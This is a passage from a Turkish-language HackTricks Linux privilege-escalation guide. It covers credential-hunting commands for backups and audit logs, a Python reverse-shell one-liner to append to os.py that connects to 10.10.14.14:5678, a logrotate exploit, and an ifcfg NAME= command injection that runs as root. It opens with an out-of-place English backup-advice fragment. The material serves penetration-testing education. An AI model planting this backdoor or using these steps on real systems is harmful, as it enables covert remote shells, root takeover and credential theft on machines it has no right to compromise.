* **Offsite Storage**: Store backups in an offsite location to protect against physical damage or theft. Cloud storage or remote servers can be used for this purpose.
* **Encryption**: Encrypt backups to protect sensitive data from unauthorized access. This is especially important when storing backups in the cloud or on external storage devices.
* **Testing and Verification**: Regularly test and verify the integrity of backups to ensure they can be successfully restored when needed. This includes testing the restoration process and verifying the accuracy of the restored data.

By following these backup best practices, you can enhance the security and resilience of your system, and mitigate the impact of privilege escalation attacks.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Bilinen şifre içeren dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun, **şifre içerebilecek birkaç olası dosyayı arar**.\
Bunun yanı sıra kullanabileceğiniz **başka bir ilginç araç** ise [**LaZagne**](https://github.com/AlessandroZ/LaZagne), Windows, Linux ve Mac için yerel bir bilgisayarda depolanan birçok şifreyi almak için kullanılan açık kaynaklı bir uygulamadır.

### Günlükler

Günlükleri okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler bulabilirsiniz**. Günlük ne kadar garipse, o kadar ilginç olabilir (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (arka kapılı?) **denetim günlükleri**, şifreleri denetim günlüklerinin içine kaydetmenize izin verebilir, bu konuyla ilgili olarak şu yazıyı inceleyebilirsiniz: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

**Kabuk dosyaları**

Shell dosyaları, Linux sisteminde komutları çalıştırmak için kullanılan betik dosyalardır. Bu dosyalar, bir dizi komutu otomatik olarak çalıştırmak için kullanılabilir ve genellikle bir dizi işlemi otomatikleştirmek veya tekrarlayan görevleri gerçekleştirmek için kullanılır.

Shell dosyaları, bir metin düzenleyiciyle oluşturulabilir ve genellikle `.sh` uzantısıyla kaydedilir. Bu dosyalar, çalıştırılabilir hale getirildikten sonra terminalde çalıştırılabilir.

Shell dosyaları, bir kullanıcının yetkilerini artırmak için de kullanılabilir. Örneğin, bir kullanıcının normal kullanıcı haklarıyla erişilemeyen bir dosyayı okuması gerekiyorsa, bir shell dosyası kullanarak bu dosyayı okuyabilir.

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Genel Kimlik Bilgileri Arama/Regex

Ayrıca, **adında** veya içeriğinde "**şifre**" kelimesini içeren dosyaları kontrol etmelisiniz ve ayrıca günlüklerdeki IP'leri ve e-postaları veya karmaşık ifadeleri kontrol etmelisiniz. Bunların nasıl yapılacağını burada listelemeyeceğim, ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri kontrol edebilirsiniz.

## Yazılabilir dosyalar

### Python kütüphane ele geçirme

Bir python betiğinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabilirsiniz** veya python kütüphanelerini **değiştirebilirsiniz**, işletim sistemi kütüphanesini değiştirip arkasına zararlı yazılım yerleştirebilirsiniz (python betiğinin çalıştırılacağı yere yazabilirseniz, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneye zararlı yazılım yerleştirmek için sadece os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate istismarı

`logrotate`'deki bir güvenlik açığı, bir günlük dosyasında veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların ayrıcalıklarını yükseltebilmelerine olanak tanır. Bu, `logrotate`'un genellikle **root** olarak çalıştığı ve özellikle _**/etc/bash\_completion.d/**_ gibi dizinlerde keyfi dosyaları çalıştırmak için manipüle edilebileceği anlamına gelir. İzinleri kontrol etmek, sadece _/var/log_ değil, aynı zamanda günlük döndürmenin uygulandığı herhangi bir dizinde de önemlidir.

{% hint style="info" %}
Bu güvenlik açığı, `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler.
{% endhint %}

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı, [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerdir, bu nedenle günlükleri değiştirebileceğinizi fark ettiğinizde, günlükleri kimin yönettiğini kontrol edin ve sembollerle ayrıcalıkları yükseltebileceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenden dolayı, bir kullanıcının _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<ne olursa olsun>` betiği **yazabilmesi** veya mevcut bir betiği **ayarlayabilmesi** durumunda, **sisteminiz ele geçirilmiştir**.

Ağ betikleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~kaynaklanır\~.

Benim durumumda, bu ağ betiklerindeki `NAME=` özelliği doğru şekilde işlenmiyor. İsmin içinde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı anlamına gelir**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **klasik Linux hizmet yönetim sistemi** olan System V init (SysVinit) için **betiklere** ev sahipliği yapar. Bu dizinde, hizmetleri `başlatmak`, `durdurmak`, `yeniden başlatmak` ve bazen `yeniden yüklemek` için betikler bulunur. Bunlar doğrudan veya `/etc/rc?.d/` dizininde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol ise `/etc/rc.d/init.d` dizinidir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir. Upstart, Ubuntu tarafından tanıtılan daha yeni bir **hizmet yönetimi** sistemidir ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, Upstart yapılandırmalarıyla birlikte SysVinit betikleri hala kullanılmaktadır çünkü Upstart'ta uyumluluk katmanı bulunmaktadır.

**systemd**, talep üzerine daemon başlatma, otomatik bağlama yönetimi ve sistem durumu anlık görüntüleme gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak ortaya çıkar. Dağıtım paketleri için dosyaları `/usr/lib/systemd/` dizinine ve yönetici değişiklikleri için `/etc/systemd/system/` dizinine yerleştirir, sistem yönetimi sürecini kolaylaştırır.

## Diğer İpuçları

### NFS Ayrıcalık Yükseltme

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Kısıtlanmış Kabuklardan Kaçma

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel Güvenlik Korumaları

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha Fazla Yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Ayrıcalık Yükseltme Araçları

### **Linux yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'te çekirdek zafiyetlerini sıralar [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla betik derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sıfırdan kahramana kadar AWS hackleme öğrenin</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin

</details>
